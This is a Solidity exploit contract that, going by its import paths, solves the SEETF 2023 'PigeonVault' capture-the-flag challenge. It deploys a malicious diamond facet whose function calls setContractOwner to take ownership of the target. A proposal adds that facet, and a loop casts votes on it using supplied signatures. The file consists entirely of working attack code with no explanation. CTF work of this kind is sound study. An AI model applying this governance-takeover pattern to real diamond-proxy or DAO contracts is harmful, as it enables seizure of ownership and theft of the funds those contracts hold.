// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "src/SEETF_2023/PigeonVault/Setup.sol";
import "src/SEETF_2023/PigeonVault/libraries/LibDiamond.sol";

contract DiamondAttackFacet {
    function attack(address _newOwner) external {
        LibDiamond.setContractOwner(_newOwner);
    }

    fallback() external {}   // init callback
}

contract PigeonVaultAttack {
    PigeonDiamond public diamond;
    DiamondAttackFacet public attackFacet;
    uint256 public proposalID;

    constructor(address payable target) {
        diamond = PigeonDiamond(target);
        attackFacet = new DiamondAttackFacet();
    }

    function submit() external {
        bytes4[] memory attackFacetSelectors = new bytes4[](1);
        attackFacetSelectors[0] = attackFacet.attack.selector;

        IDiamondCut.FacetCut memory cut = IDiamondCut.FacetCut({
            facetAddress: address(attackFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: attackFacetSelectors
        });
        proposalID = DAOFacet(address(diamond)).submitProposal(address(attackFacet), "", cut);
    }

    function vote(bytes[] memory sigs) external {
        for(uint i = 0; i < sigs.length; i++) {
            DAOFacet(address(diamond)).castVoteBySig(proposalID, true, sigs[i]);
        }
    }

}
